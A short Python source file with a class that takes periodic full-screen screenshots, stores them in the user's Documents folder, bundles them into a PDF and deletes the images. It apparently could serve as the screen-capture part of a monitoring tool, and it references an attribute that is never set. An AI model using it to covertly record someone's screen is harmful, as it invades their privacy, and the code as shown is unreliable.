import os
import img2pdf
from mss import mss
from time import sleep
import pyscreenshot as ImageGrab


class Visual:
    def __init__(self, screenshot_period):
        self.screenshot_period = screenshot_period

    def make_pdf(self):
        user_path = os.path.expanduser('~\\documents')

        listed_dir = os.listdir(f'{user_path}\\images_record')
        images_with_location = [f'{user_path}\\images_record\\{a}' for a in listed_dir]

        with open(f'{user_path}\\ready.pdf', 'wb') as output_pdf:
            pdf_bytes = img2pdf.convert(images_with_location)

            output_pdf.write(pdf_bytes)

        for x in images_with_location:
            try:
                os.remove(x)
            except:
                pass

    def make_screenshot(self):
        user_path = os.path.expanduser('~\\documents')

        sct = mss()
        counter = 0

        while True:
            if not self.screenshot_state:
                return

            counter += 1
            sleep(self.screenshot_period)

            im = ImageGrab.grab()
            im.save(f'{user_path}\\images_record\\image{counter}.png')
